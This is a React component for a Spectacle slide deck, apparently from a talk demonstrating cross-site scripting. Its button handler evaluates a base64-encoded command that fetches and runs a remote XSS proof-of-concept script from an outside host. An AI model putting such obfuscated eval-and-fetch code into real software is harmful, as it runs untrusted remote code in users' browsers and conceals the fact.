import React from "react";

import {
    CodePane,
    Fill,
    Heading,
    Image,
    Layout
} from "spectacle";

const images = {
    pokemon: {
        jynx: require('../assets/jynx.jpg'),
        gyrados: require('../assets/gyarados.jpg'),
        charizard: require('../assets/charizard.jpg'),
    }
};

export default React.createClass({
    onClick(e) {
        eval(atob(`JC5nZXRTY3JpcHQoJ2h0dHBzOi8vZGluaXNjcnV6LmdpdGh1Yi5pby9YU1MtUG9jcy9wb2NzL2RhbmNlLXhzcy5qcycp`));
        e.preventDefault();
        e.stopPropagation();
    },

    render() {
        const styles = {
            padding: 20,
            background: "black",
            minWidth: 300,
            marginTop: 20,
            textTransform: "uppercase",
            border: "none",
            color: "white",
            outline: "none",
            fontWeight: "bold",
            fontSize: "2em"
        };
        return (
            <div>
                <button style={styles} type="button" onClick={this.onClick}>How bad can it be?</button>
                <Layout>
                    <Fill>
                        <Image margin={20} src={images.pokemon.charizard} width="250px" height="250px"></Image>
                    </Fill>
                    <Fill>
                        <Image margin={20} src={images.pokemon.gyrados} width="250px" height="250px"></Image>
                    </Fill>
                    <Fill>
                        <Image margin={20} src={images.pokemon.jynx} width="250px" height="250px"></Image>
                    </Fill>
                </Layout>
                <CodePane source={require('raw!../assets/xss')} lang="javascript" textSize={14} />
            </div>
        )
    }
})

